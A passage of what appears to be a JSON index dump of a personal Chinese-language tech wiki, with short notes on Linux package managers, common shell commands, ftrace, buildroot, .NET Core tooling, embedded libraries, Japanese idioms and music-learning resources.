MODE=\"0777\"","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"imgui","date":"2019-09-28T00:00:00.000Z","path":"wiki/计算机/编程/中间件/imgui/","text":"“直接式”范式的GUI，适合做如游戏调参这种复杂地与程序当前状态耦合的UI。 Using ImGui with modern C++ and STL for creating awesome game dev tools. Part 2. Some tips and tricks.https://eliasdaler.github.io/using-imgui-with-sfml-pt2/","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"中间件","slug":"计算机/编程/中间件","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/中间件/"}]},{"title":"在意的日语词汇","date":"2019-09-24T00:00:00.000Z","path":"wiki/自然语言/日语/在意的日语词汇/","text":"石の上にも三年◆読みいしのうえにもさんねん ◆意味どんなに苦しくても大変でも、じっと辛抱すれば必ず報われる。 ◆使用例今は耐えろ。石の上にも三年というじゃないか。 ◆一言メモ冷たい石も三年座り続ければ、暖かくなるという意味から語源由来になっている。三年座らなくても。と思うが、基本的に三年と言う数字に含まれる意味合いとして。長いと言う意味が含まれる。800と言う数字も「多い」と言うことに使われるのと同じである（江戸808町など、実際は800町なかったと言われる。）","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"日语","slug":"自然语言/日语","permalink":"http://wiki.noodlefighter.com/categories/自然语言/日语/"}]},{"title":"翻译相关工具","date":"2019-09-24T00:00:00.000Z","path":"wiki/自然语言/翻译/翻译相关工具/","text":"OmegaTOmegaT 是一种使用Java语言编写的免费译法记忆程序。它是提供给专业翻译者使用的工具。但它不会自动为你进行翻译。（进行这项工作的软件叫做“机器翻译”，你得去别处找。）OmegaT具有以下特性： 模糊匹配 匹配传播 对多文件项目的并发处理 对多个翻译记忆的并发使用 外部词汇表 文档文件格式：Microsoft Word, Excel, Powerpoint (.docx, .xlsx, .pptx)XHTML 和 HTMLOpen Document Format (LibreOffice, OpenOffice.org)MediaWiki (Wikipedia)Plain text以及其他30多种文件格式 Unicode (UTF-8) 支持：可使用非拉丁语系字母表 支持从右往左读的语言 完整的拼写检查器 和其它翻译记忆程序兼容(TMX, TTX, TXML, XLIFF, SDLXLIFF) 有连接Google Translate的接口","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"}]},{"title":"音乐相关工具","date":"2019-09-24T00:00:00.000Z","path":"wiki/艺术/音乐/音乐相关工具/","text":"Sonic Visualiserhttps://www.sonicvisualiser.org/ 音乐音响结构分析软件 soundenginehttps://soundengine.jp/software/soundengine/ 免费音频编辑工具","tags":[],"categories":[{"name":"艺术","slug":"艺术","permalink":"http://wiki.noodlefighter.com/categories/艺术/"},{"name":"音乐","slug":"艺术/音乐","permalink":"http://wiki.noodlefighter.com/categories/艺术/音乐/"}]},{"title":"linux包管理器","date":"2019-09-24T00:00:00.000Z","path":"wiki/计算机/linux/distribution/linux包管理器/","text":"一些流行的 Linux 发行版包管理器命令的对应关系https://wiki.archlinux.org/index.php/Pacman/Rosetta_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) pacman系pacman是arch系下的包管理工具 Archlinux 的灵魂──PKGBUILD、AUR 和 ABShttps://blog.csdn.net/taiyang1987912/article/details/41457333# 1234567891011# 更新所有包pacman -Syu# 搜索包pacman -Ss xxx# 安装包pacman -S xxx# 删除软件包，顺便移除没被其他包依赖的依赖包pacman -Rs xxx pacman自动更换中国源12# pacman-mirrors -c China# pacman -Syy AUR是非官方提供的包为了安全，一般不是直接发布二进制包，而是一些包含编译脚本的信息。 使用yay可以方便地使用AUR： 1pacman -S yay yay支持pacman风格的命令，挪过来就能用。 apt123456# 列出包中安装的文件位置dpkg -L packagename# 检查是否安装成功dpkg -l | grep packagename# 同上apt list --installed | grep packagename auto-apt源码编译安装时，自动生成deb包方便管理 使用auto-apt 和 checkinstall，具体命令如下1234#安装auto-apt和checkinstallapt install auto-apt checkinstall#在源码目录中auto-apt run ./configuremakecheckinstall 这样会生成一个deb包，卸载和重新安装就非常方便了 12345#完全卸载 (packagename具体的名字在checkintall完成之后会有提示）dpkg -r packagename#用生成的deb包重新安装dpkg -i ***.deb apt解决坏依赖比如提示12The following packages have unmet dependencies:libpcre3-dev : Depends: libpcre3 (= 1:8.31-2ubuntu2) but 1:8.31-2ubuntu2.1 is to be installed 可以强制指定版本1sudo apt-get install libpcre3=1:8.31-2ubuntu2 libpcre3-dev=1:8.31-2ubuntu2","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"distribution","slug":"计算机/linux/distribution","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/distribution/"}]},{"title":"linux桌面环境配置","date":"2019-09-24T00:00:00.000Z","path":"wiki/计算机/linux/distribution/linux桌面环境配置/","text":"中文字体文泉驿字体wqy-microhei wqy-zenhei 思源字体adobe-source：思源宋体source-han-serif；思源黑体source-han-sans 中文等宽字体MSharp DG Console Blod 11号 设置记录分辨率1080p，cinnamon环境 非等宽：文泉驿微米黑Regular 10号 等宽：MSharp DG Console Blod 11号 JRE程序改善字体https://stackoverflow.com/questions/17510099/ugly-fonts-in-java-applications-on-ubuntu 123456789# Install both infinality and fontfix'ed JDK.sudo add-apt-repository ppa:no1wantdthisname/ppasudo add-apt-repository ppa:no1wantdthisname/openjdk-fontfixsudo apt-get updatesudo apt-get install fontconfig-infinality openjdk-7-jdk# Apply a font style that looks good.sudo /etc/fonts/infinality/infctl.sh setstyle linux# And reboot the system.sudo reboot gnome下字体改善安装gnome-tweak fontconfig-infinality todo:","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"distribution","slug":"计算机/linux/distribution","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/distribution/"}]},{"title":"manjaro布置","date":"2019-09-24T00:00:00.000Z","path":"wiki/计算机/linux/distribution/manjaro布置/","text":"TODO 搬移 网络命令1234arp = ip neighborifconfig = ip address, ip linknetstat = ssroute = ip route ibus配置配置文件在~/.config/ibus .xprofile：1234export GTK_IM_MODULE=ibusexport XMODIFIERS=@im=ibusexport QT_IM_MODULE=ibusibus-daemon -d -x 默认输入法为第一个，顺序在dconf中配置：desktop/ibus/general/engines-order。 安装字体12345mkdir /usr/share/fonts/cd /usr/share/fonts/mkfontscalemkfontdirfc-cache -fv","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"distribution","slug":"计算机/linux/distribution","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/distribution/"}]},{"title":"内核模块调试ftrace","date":"2019-09-24T00:00:00.000Z","path":"wiki/计算机/linux/kernel/内核模块调试ftrace/","text":"https://lwn.net/Articles/365835/ printk常用，但效率差，ftrace机制是一个性能更高的追踪机制。 内核需要开启： 1234CONFIG_FUNCTION_TRACERCONFIG_FUNCTION_GRAPH_TRACERCONFIG_STACK_TRACERCONFIG_DYNAMIC_FTRACE 基本用法，跟踪函数调用情况1234567891011121314151617181920212223242526272829303132333435363738394041[~]# cd /sys/kernel/debug/tracing[tracing]#[tracing]# cat available_tracers function_graph function sched_switch nop[tracing]# echo function > current_tracer[tracing]# cat current_tracerfunction[tracing]# cat trace | head -10# tracer: function## TASK-PID CPU# TIMESTAMP FUNCTION# | | | | | bash-16939 [000] 6075.461561: mutex_unlock","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"xdelta","date":"2019-09-24T00:00:00.000Z","path":"wiki/计算机/linux/tools/xdelta/","text":"xdelta是个用于制作二进制patch的工具，生成出来的补丁很小。 新文件（targetfile）和旧文件（sourcefile）做差分（differencing），又有对产生的patch包进行压缩（compression），产生patch包的过程统称为编码（encoding），而将合成新文件的过程统称为解码（decoding）。 Xdelta3和经典的压缩算法LZ’77一样，也是将source file划分成一个个不相交而又连续的window，然后进行encoding和decoding。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"csharp-with-vscode","date":"2019-09-24T00:00:00.000Z","path":"wiki/计算机/编程/Csharp/csharp-with-vscode/","text":".Net Core项目MS在开源社区上的努力成功之一，早几年尝试过Mono Project但问题比较多只是个玩具，但现在官方在跨平台上发力了。 dotnet clidotnet命令行工具。帮助文档： https://docs.microsoft.com/en-us/dotnet/core/tools/?tabs=netcore2x 如： 1234# 新建解决方案：dotnet new sln# 将工程加入解决方案dotnet sln add vscode中使用C使用一个OmniSharp插件即可. 遇到的问题“OmniSharp could not find the ‘Microsoft.NET.Sdk’ thing.”Please add this two files to the package: /etc/profile.d/dotnet.sh 123export DOTNET_ROOT=/opt/dotnetexport MSBuildSDKsPath=$DOTNET_ROOT/sdk/$(${DOTNET_ROOT}/dotnet --version)/Sdksexport PATH=${PATH}:${DOTNET_ROOT} /etc/profile.d/dotnet.csh123setenv DOTNET_ROOT=\"/opt/dotnet\"setenv MSBuildSDKsPath=\"${DOTNET_ROOT}/sdk/$(${DOTNET_ROOT}/dotnet --version)/Sdks\"setenv PATH=\"${PATH}:${DOTNET_ROOT}\" MSBuild构建相关用Visual Studio时并不需要关心构建，但使用dotnet cli就有可能需要修改构建文件。 文件格式： https://docs.microsoft.com/zh-cn/visualstudio/msbuild/msbuild-project-file-schema-reference?view=vs-2019 dotnet中对MSBuild增加的部分： https://docs.microsoft.com/zh-cn/dotnet/core/tools/csproj Release发布： 1dotnet publish -r win-x64 -c release .Net Core 3.0支持将程序打包成小体积的单个二进制文件： https://www.hanselman.com/blog/MakingATinyNETCore30EntirelySelfcontainedSingleExecutable.aspx","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"Csharp","slug":"计算机/编程/Csharp","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/Csharp/"}]},{"title":"xmake","date":"2019-09-24T00:00:00.000Z","path":"wiki/计算机/编程/xmake/","text":"xmake是个跨平台的构建工具，使用lua脚本语言描述构建。 定位和cmake比较相似，但更简单易上手。 手册： https://xmake.io/#/zh-cn/manual","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"}]},{"title":"sdl库","date":"2019-09-24T00:00:00.000Z","path":"wiki/计算机/编程/中间件/sdl库/","text":"SDL2使用framebuffer输出https://solarianprogrammer.com/2015/01/22/raspberry-pi-raspbian-getting-started-sdl-2/ https://progbook.org/sdl.html","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"中间件","slug":"计算机/编程/中间件","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/中间件/"}]},{"title":"嵌入式软件平台","date":"2019-09-23T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/嵌入式软件平台/","text":"RTOSAndroid大名鼎鼎的Android，其中Linux内核部分有很多能参考的。 https://android.googlesource.com/kernel/ https://source.android.com/setup/build/building-kernels ChibiOS [GPL 商业免费/收费]http://www.chibios.org/ 一个可GPL免费使用的RTOS 带有一个apache开源协议的硬件抽象层 Zephyr [Apache]https://www.zephyrproject.org/ linux基金会下 因特尔主导的一个小巧的RTOS 有自己的硬件抽象层 主要针对小型系统 区别于大多数小RTOS的精简核心，zephyr更像一个小的linux，开发模式决定了模块间比较强的耦合。 RT-Threadhttps://github.com/RT-Thread/rt-thread 国产RTOS Mark3 [BSD]http://www.mark3os.com （已死，做个标记） C++ RTOS TNKernel [不明]https://bitbucket.org/dfrank/tneokernel 一个RTOS核 作者写了篇日志..码着看 http://dmitryfrank.com/articles/how_i_ended_up_writing_my_own_kernel 硬件抽象层libopencm3 [GPL3]https://github.com/libopencm3/libopencm3 针对Cortex-M3的硬件抽象库 ChibiOS HALhttp://www.chibios.org/dokuwiki/doku.php?id=chibios:product:hal:start ChibiOS的硬件抽象层 编程框架protothread协程PT协程 lw_coroutine协程https://github.com/xiaoliang314/lw_coroutine宣称比PT协程更高效更好用的类PT协程 QP-nanohttps://www.state-machine.com/qpn/ QP层次状态机框架Nano版。 bootloadermcuboothttps://github.com/JuulLabs-OSS/mcuboot","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"内核相关","date":"2019-09-23T00:00:00.000Z","path":"wiki/计算机/linux/devtools/内核相关/","text":"内核中可配置的项目/sys/kernel目录下是所以内核中可配置的项目 内核编译时仅编译部分内核模块1make modules SUBDIRS=drivers/usb/gadget 目录外编译Makefile： 123456789LINUX_ROOT ?= /lib/modules/$(shell uname -r)/buildobj-m := f_accessory.odefault: @make -C $(LINUX_ROOT) M=$(PWD) modulesclean: @make -C $(LINUX_ROOT) M=$(PWD) clean","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"linux自带工具","date":"2019-09-23T00:00:00.000Z","path":"wiki/计算机/linux/tools/linux自带工具/","text":"mkdir 创建目录cp 拷贝cat 输出文件内容stat 查看文件属性ll 罗列当前目录内容（-h 以K,M,G单位表示文件大小）chmod 修改权限，常用开关-R递归，例子 chmod -R a+wr *mv 移动文件rm 删除,常用开关-f强制-r递归ps 查看进程 常用开关-auxkill 杀进程，用进程号 killall 杀进程，用程序名字 nohup 后台运行进程 nohup ./xx.sh >output 2>&1 &find /home -name “abc.txt”tail 查看指定文件末尾几行which 获取指定文件的完整路径（$PATH中的）shred 粉碎文件tail 看文件尾部 -f参数看实时log日志（追加文件内容）lsusb 查看usb设备lsof 列出被打开的文件、被哪个应用打开 lspci 查看pci设备 file 查看文件类型（比如ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, not stripped）htop 查看哪个程序占用了cpu/ram资源iotop 查看哪个程序阻塞了io资源 whereis 找二进制文件、其帮助文档的位置 hexdump 16进制查看（-C参数增加ASCII文本显示） man 使用手册info 比使用手册更详细的“电子书” nano 文本编辑器 ssh 远程登入工具 catcat拼接文件，连接文件，合并文件 1$ cat file1.bin file2.bin mount123# 判断一个目录是否是挂载点mountpoint -q /mntecho $? tar 解压压缩.tar文件本身只是“归档”文件，把多个文件打包，而不带压缩；而.tar.gz文件是先把一些文件打包，然后用gzip压缩。 commands： 1234567891011121314151617c 压缩x 解压t 列表v 繁琐地打印一些信息z gzipf 使用归档文件创建/解压归档文件$ tar -cf xxx.tar foo1 foo2$ tar -xf xxx.tar创建归档gzip压缩文件$ tar -czf xxx.tar.gz foo1 foo2$ tar -xzf xxx.tar.gz查看文件列表：$ tar -tvf xxx.tar linux校验值计算命令1234567# cd /usr/bin && find -name \"*sum\"./cksum./md5sum./sha1sum./sha256sum./sha3sum./sha512sum cksum是CRC32 管道123456789> 输出到& 后台运行, 如 echo abc &|more和|less 用管道把上一条命令导过来显示，方便查看，比如一屏看不完的时候可以用上用../source.txt批量覆盖找到的a.txtfind -name \"a.txt\"|xargs -I{} cp -f ../source.txt {}|grep 根据关键词获取到某行内容|awk 'NR==3 {print $1}' 获取第3行的第1个“参数” 输出个log0 STDIN 1 STDOUT 2 STDERR 1cat foo > foo.log 2>&1 以别的用户身份执行命令12su - username -c \"command\" crontab -e -u username ps查看实际使用内存 1ps -o pid,comm,rss du统计文件夹大小 例，深度1： 1$ du --max-depth=1 -h /usr/ watchlinux循环执行命令 2s执行一次 1wait -n 2 “xxx” dmsg设备相关log，常用于诊断设备故障，比如查看加载了哪些驱动、把什么硬件资源分配给了什么驱动。 例如usb设备的插拔信息、给pci设备加载了什么驱动。 通过网络更新系统时间linux网络授时，使用NTP客户端完成： 1$ sudo ntpdate -u ntp.api.bz 待分类archivemount 利用FUSE（用户层文件系统框架）将归档文件mount到文件系统中gdb-multiarch 多架构gdb, 工具链中的gdb有问题的时候可以用","tags":[{"name":"linux","slug":"linux","permalink":"http://wiki.noodlefighter.com/tags/linux/"},{"name":"command","slug":"command","permalink":"http://wiki.noodlefighter.com/tags/command/"}],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"gcc错误集","date":"2019-09-23T00:00:00.000Z","path":"wiki/计算机/编程/C/gcc错误集/","text":"undefined behavior [-Waggressive-loop-optimizations]123#define RGBLED_ROW 4#define RGBLED_COL 4static uint8_t _g_rgb_data[RGBLED_ROW][RGBLED_COL][3]; 12345678channel = 0;for (i = 0; i < RGBLED_ROW; i++) { for (j = 0; j < RGBLED_COL; j++) { data[channel++] = (uint16_t) (_g_rgb_data[i][j][0] < 2);","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"计算机术语_日语","date":"2019-09-19T00:00:00.000Z","path":"wiki/自然语言/日语/计算机术语-日语/","text":"割り込み 中断，interrupt","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"日语","slug":"自然语言/日语","permalink":"http://wiki.noodlefighter.com/categories/自然语言/日语/"}]},{"title":"音乐基础学习","date":"2019-09-19T00:00:00.000Z","path":"wiki/艺术/音乐/音乐基础学习/","text":"学习资源好和弦视频课程：https://www.youtube.com/channel/UCVXstWyJeO6No3jYELxYrjg/videoshttps://www.upchord.cn/downloads/nicechord 初学听力、乐理学习 https://www.musictheory.net/ Online Ear Trainer进阶听力 https://www.iwasdoingallright.com/tools/ear_training/online/ GNU Solfege 免费听音、节奏训练 https://www.gnu.org/software/solfege/solfege.html EarMaster练耳大师 http://www.earmasterchina.cn/","tags":[],"categories":[{"name":"艺术","slug":"艺术","permalink":"http://wiki.noodlefighter.com/categories/艺术/"},{"name":"音乐","slug":"艺术/音乐","permalink":"http://wiki.noodlefighter.com/categories/艺术/音乐/"}]},{"title":"算法","date":"2019-09-06T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/算法/","text":"加密库mbedtls [混杂，主要是Apache]https://github.com/ARMmbed/mbedtls 数学计算libfixmathd [MIT]https://github.com/PetteriAimonen/libfixmath 定点数计算库 libfixmatrix [MIT]https://github.com/PetteriAimonen/libfixmatrix 定点矩阵运算 加密/压缩miniLZO [GPL]http://www.oberhumer.com/opensource/lzo/#minilzo 一个压缩算法库 LZO的mini版本","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"通讯和总线协议","date":"2019-09-06T00:00:00.000Z","path":"wiki/电子工程/嵌入式开源项目/通讯和总线协议/","text":"minmea [WTFPL]https://github.com/kosma/minmea轻量的GPS NMEA0183协议解析库，纯C实现 FreeModbushttps://github.com/armink/FreeModbus_Slave-Master-RTT-STM32 添加了主机模式的FreeModbus protocol buffernanopb[zlib]文档说编译出来2-10k code size，实际上如果要用到构造+解析器，那么尺寸就得有8k以上了。 https://github.com/nanopb/nanopb https://jpa.kapsi.fi/nanopb/docs/reference.html Protobuf-Embedded-C[Apache]https://github.com/berezovskyi/protobuf-embedded-c lwpb[Apache]https://github.com/acg/lwpb USBSTM8S-USB [?]https://github.com/ZiB/STM8S-USB STM8软件USB实现 USB Raw HID [?]http://www.pjrc.com/teensy/rawhid.html 使用RAW HID与下位单片机通讯（只提供了AVR程序 但可以参考着改成其他） 提供了几个读写数据的简单函数（有Linux MACOSX Win实现） 适用于USB小数据传输场合 V-USB(avrusb) [GPL]http://www.obdev.at/products/vusb/ AVR软件USB库 HIDAPI [GPLv3 BSD]http://www.signal11.us/oss/hidapi/ 跨平台HID API (HID API for Linux, Mac OS X, and Windows) libusbhttp://www.libusb.org/ usb通用驱动 libusbK [GPL modifiedBSD]http://libusbk.sourceforge.net/UsbK3/index.html win下专用的libusb 功能完整 usbmuxhttps://github.com/libimobiledevice/usbmuxd 与iOS设备通讯，USB中创建socket连接。 webusbhttps://github.com/WICG/webusb 网页上与USB设备通讯","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式开源项目","slug":"电子工程/嵌入式开源项目","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式开源项目/"}]},{"title":"buildroot","date":"2019-09-06T00:00:00.000Z","path":"wiki/计算机/linux/devtools/buildroot/","text":"构建流程构建出来的目录： 1234567891011121314151617181920212223242526272829303132333435363738r@r-work ~/osp/buildroot-2019.02.1/output $ tree -L 2.├── build│ ├── buildroot-config│ ├── buildroot-fs 。。。略去一堆包的构建目录和build相关log。。。│ ├── toolchain-external│ └── toolchain-external-custom├── host│ ├── arm-buildroot-linux-uclibcgnueabi│ ├── bin│ ├── etc│ ├── include│ ├── lib│ ├── lib64 -> lib│ ├── share│ └── usr -> .├── images│ ├── rootfs.tar│ └── rootfs.tar.gz├── staging -> /home/r/osp/buildroot-2019.02.1/output/host/arm-buildroot-linux-uclibcgnueabi/sysroot└── target ├── bin ├── dev ├── etc ├── lib ├── lib32 -> lib ├── media ├── mnt ├── opt ├── proc ├── root ├── run ├── sbin ├── sys ├── THIS_IS_NOT_YOUR_ROOT_FILESYSTEM ├── tmp └── usr 文件夹功能：1234build 存放packages的源码、构建loghost 存放交叉编译中宿主（host）依赖的相关工具：比如automake、m4；此外还有交叉编译工具链，比如这里的“arm-buildroot-linux-uclibcgnueabi”target 目标根文件系统的中间产品images 最终产品，比如编译好的系统内核、打包好的根文件系统（镜象、归档） 流程大概是： 构建交叉编译工具链：如果配置由buildroot来构建工具链，则编译后安装到host目录；如果配置了外部工具链（external-toolchain），则会将工具链按照一定规则copy到host目录中 构建宿主工具 构建目标packages：下载、打patch、编译、安装到target目录中 打包 处理与buildroot不相容的工具链配置使用外部工具链后，buildroot将从指定路径copy工具链到host目录中，主要是一些libs，这个步骤导致一些目录结构比较奇葩的工具链无法用于buildroot。 这里有几个解决思路： 放弃使用外部工具链，使用buildroot构建 使用Crosstool-NG等工具构建，buildroot兼容这些常见工具构建出的工具链 尝试修改buildroot源码 开发过程中使用buildroot构建buildroot中的package基本是已经稳定的包，所以都是从源码包中解压-编译-安装，但我们不会希望正在开发的工程走这样的流程，而是直接从源码编译，解决方法如下： 下面这段翻译自: https://buildroot.org/downloads/manual/manual.html#_using_buildroot_during_development Buildroot的正常操作是下载源码包，解压缩，配置，编译和安装源码包中的软件。源代码在output/build/-中提取，这是一个临时目录：每当使用make clean时，该目录将被完全删除，并在下一次make调用时重新创建。即使使用Git或Subversion存储库作为包源代码的输入，Buildroot也会创建一个源码包，然后像上文说的流程使用它。当Buildroot主要用作集成工具时，这种行为非常适合构建、集成嵌入式Linux系统的组件。但是，如果在系统的某些组件的开发过程中使用Buildroot，这种行为不是很方便：当需要对一个包的源代码做一点小的改动，并且能够使用Buildroot快速重建系统时。直接在output/build/-中进行更改不是一个合适的解决方案，因为在make clean时会删除目录。因此，Buildroot为此用例提供了一种特定的机制： _OVERRIDE_SRCDIR机制。Buildroot读取OVERRIDE文件，用户通过它告诉Buildroot一些源码包的位置。默认情况下，此覆盖文件名为local.mk，位于Buildroot源树的顶级目录中，但可以通过BR2_PACKAGE_OVERRIDE_FILE配置选项指定其他位置。 基于buildroot自定义的部分我们总会根据自己的平台，添加、修改一些包、补丁、defconfig等 需要添加自定义软件包时，无需直接修改buildroot目录，它提供了一个机制方便在目录外添加额外包、配置等： 文档https://github.com/fabiorush/buildroot/blob/master/docs/manual/customize-outside-br.txt 添加软件包时的依赖问题Kconfig中需要用select/depends on来描述软件包依赖，但这并不会自动地在构建中确定构建顺序，需要手动地在.mk中描述依赖关系。 比如当创建一个generic-package时，.mk文件中的LIBFOO_DEPENDENCIES指定了依赖关系。 自动登录调试时会希望有个自动登入的环境，修改/etc/inittab中： 1ttySAC0::respawn:/sbin/getty -L ttySAC0 115200 vt100 # GENERIC_SERIAL 改为： 1::respawn:-/bin/sh todo: 下列段落似乎不适合放buildroot里，毕竟通用知识 设备节点实现方式的选择 [Buildroot] Device files and Buildrootvia: http://lists.busybox.net/pipermail/buildroot/2011-December/048057.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354With Buildroot, you have four ways of managing the device filesin /dev. The mechanism used to manage device files is configured fromSystem configuration -> /dev management. The four ways are : * Static using device table. In this case the \"System configuration -> Path to the device tables\" option gives a space-separated list of files, each of which containing a list of devices to create at build time in the root filesystem. By default, this list is defined to just the target/generic/device_table_dev.txt, which creates some basic device files. Those device files are created at *build* time and are statically present in the root filesystem image generated by Buildroot. All basic devices such as /dev/console, /dev/null and al. are already present in the default device table. If you are in this mode and want to add more device files, then you should add them to target/generic/device_table_dev.txt, or better, create your own additional device table in board///device_table.txt, and add it to the space-separated list in \"System configuration -> Path to the device tables\". * Dynamic using devtmpfs only. Devtmpfs is a virtual filesystem implemented in the Linux kernel that can be mounted in /dev. The kernel will automatically create/remove device files from this filesystem as devices appear/disappear from the system. devtmpfs exists in the Linux kernel since 2.6.32. When this option is selected *and* Buildroot is responsible for building the kernel, then Buildroot ensures that the kernel is built with the appropriate options to make devtmpfs work. When Buildroot is *not* responsible for building the kernel (the user does it on its own), then the user is responsible for making sure that CONFIG_DEVTMPFS and CONFIG_DEVTMPFS_MOUNT are both enabled in the kernel configuration. When this mode is used, no static device files are created in the root filesystem: the device files are automatically created at boot time by the kernel. * Dynamic using mdev. This is exactly like with 'devtmpfs' (i.e, devtmpfs is required for this mode to work), but Buildroot adds the mdev utility into the mix. mdev is an utility bundled with Busybox which gets executed when the kernel notifies that a device has been added or removed from the system. Compared to a pure 'devtmpfs' solution, it allows to execute arbitrary applications or shell scripts when devices appear/disappear. mdev behaviour can be configured from /etc/mdev.conf, refer to the Busybox documentation for more details. Since this case relies on devtmpfs, there are no static device files created in the root filesystem, and no device table is used. * Dynamic using udev. This is also exactly like with 'devtmpfs' (i.e, devtmpfs is required for this mode to work), but Buildroot adds the udev daemon into the mix. udev is the \"device event manager\" used in all Linux desktop and server systems and can be seen as a \"full-featured\" mdev. It is more configurable, provides a library called libudev to allow applications to query for which devices are available, etc. 热插拔mdev是busybox上类似udev的实现，看help和/etc/init.d/S10mdev就能大概了解用法。（这还有mdev文档） 12345678910111213141516171819202122# mdevBusyBox v1.29.3 (2019-04-10 20:07:42 CST) multi-call binary.Usage: mdev [-s]mdev -s is to be run during boot to scan /sys and populate /dev.Bare mdev is a kernel hotplug helper. To activate it: echo /sbin/mdev >/proc/sys/kernel/hotplugIt uses /etc/mdev.conf with lines [-][ENV=regex;]...DEVNAME UID:GID PERM [>|=PATH]|[!] [@|$|*PROG]where DEVNAME is device name regex, @major,minor[-minor2], orenvironment variable regex. A common use of the latter isto load modules for hotplugged devices: $MODALIAS=.* 0:0 660 @modprobe \"$MODALIAS\"If /dev/mdev.seq file exists, mdev will wait for its valueto match $SEQNUM variable. This prevents plug/unplug races.To activate this feature, create empty /dev/mdev.seq at boot.If /dev/mdev.log file exists, debug log will be appended to 